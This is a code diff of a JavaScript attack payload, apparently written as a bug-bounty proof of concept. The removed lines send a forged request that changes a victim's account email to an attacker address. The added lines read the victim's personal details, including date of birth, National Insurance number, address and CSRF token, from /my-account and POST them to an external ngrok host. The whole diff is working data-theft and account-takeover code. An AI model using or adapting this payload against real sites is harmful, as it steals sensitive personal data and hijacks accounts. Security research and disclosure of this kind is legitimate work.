@@ -16,10 +16,24 @@ req1.onreadystatechange = function()
         req2.open('get','/my-account',true);
         req2.send();
         function handleResponse() {
+        var Email = document.getElementsByTagName("input")['CurrentEmailInput'].value;
+        var FirstName = document.getElementsByTagName("input")['FirstNameInput'].value;
+        var SurName = document.getElementsByTagName("input")['SurnameInput'].value;
+        var ContactNo = document.getElementsByTagName("input")['ContactNumberInput'].value;
+        var FirstLineAddress = document.getElementsByTagName("input")['FirstLineAddressInput'].value;
+        var SecondLineAddress = document.getElementsByTagName("input")['SecondLineAddressInput'].value;
+        var Town = document.getElementsByTagName("input")['TownInput'].value;
+        var Country = document.getElementsByTagName("input")['CountryInput'].value;
+        var postCode = document.getElementsByTagName("input")['PostcodeInput'].value;
+        var DateOfBirth = document.getElementsByTagName("input")['DateOfBirthInput'].value;
+        var NationalInsuranceNumber = document.getElementsByTagName("input")['NationalInsuranceNumberInput'].value;
         var token = document.getElementsByTagName("input")['__RequestVerificationToken'].value;
-        var changeEmail = new XMLHttpRequest();
-        changeEmail.open('post', '/my-account/', true);
-        changeEmail.send('__RequestVerificationToken='+token+'&NameInput=Attack&EmailAddressInput=attacker.wearehackerone%40gmail.com&ReasonInput=&PreferNotToSay=true&PreferNotToSay=false&ufprt=FB0A18C231FCD925AE09FEF07375F9F54CDC96977CBDAEE1BA10CFAF9C131430D1547EC5B98B7F86FD44D85CD3FC942991CC63991FA8A0915CC26A3D0A0068E06962BA27804AC9BD44D01E5A7384C787AC5FC4EFD6948C96981514F71B55A0C122A1CFA12842C57633988EF9EBEFD23CAEFF74D096868CA2190A25544D9BC8CC362D42EC047D443CADE300C518AC40C0C73E35DC5C3AD24979833760C0BCC28FF75B7AE886580B3325CF2223A75B58ED38201FA7ED227984940D052C25E502F4DDF7838B')
+        var ufprt = document.getElementsByTagName("input")['ufprt'].value;
+        alert('victim_Email = ' + Email + ' \n' + 'victim_FirstName = ' + FirstName + '\n' + 'victim_SurName =' + SurName + '\n' + 'victim_ContactNo = ' + ContactNo + '\n' + 'victim_DateOfBirth = ' + DateOfBirth + '\n' + 'victim_NationalInsuranceNumber = ' + NationalInsuranceNumber + '\n' + 'victim_FirstLineAddress = ' + FirstLineAddress + '\n' + 'victim_SecondLineAddress = ' + SecondLineAddress + '\n' + 'victim_Town = ' + Town + '\n'+ 'victim_Country = ' + Country + '\n' + 'victim_postCode = ' + postCode + '\n' + 'Csrf_Token = ' + token + '\n' + 'ufprt_value = ' + ufprt);
+        
+        var stealInfo = new XMLHttpRequest();
+        stealInfo.open('post', 'https://cac9fec0e051.ngrok.io', true);
+        stealInfo.send('Email='+Email+'&FirstName='+FirstName+'&SurName='+SurName+'&ContactNo='+ContactNo+'&DateOfBirth='+DateOfBirth+'&NationalInsuranceNumber='+NationalInsuranceNumber+'&FirstLineAddress='+FirstLineAddress+'&SecondLineAddress='+SecondLineAddress+'&Town='+Town+'&Country='+Country+'&postCode='+postCode+'&__RequestVerificationToken='+token+'&ufprt='+ufprt+'')
         };
     }
 }
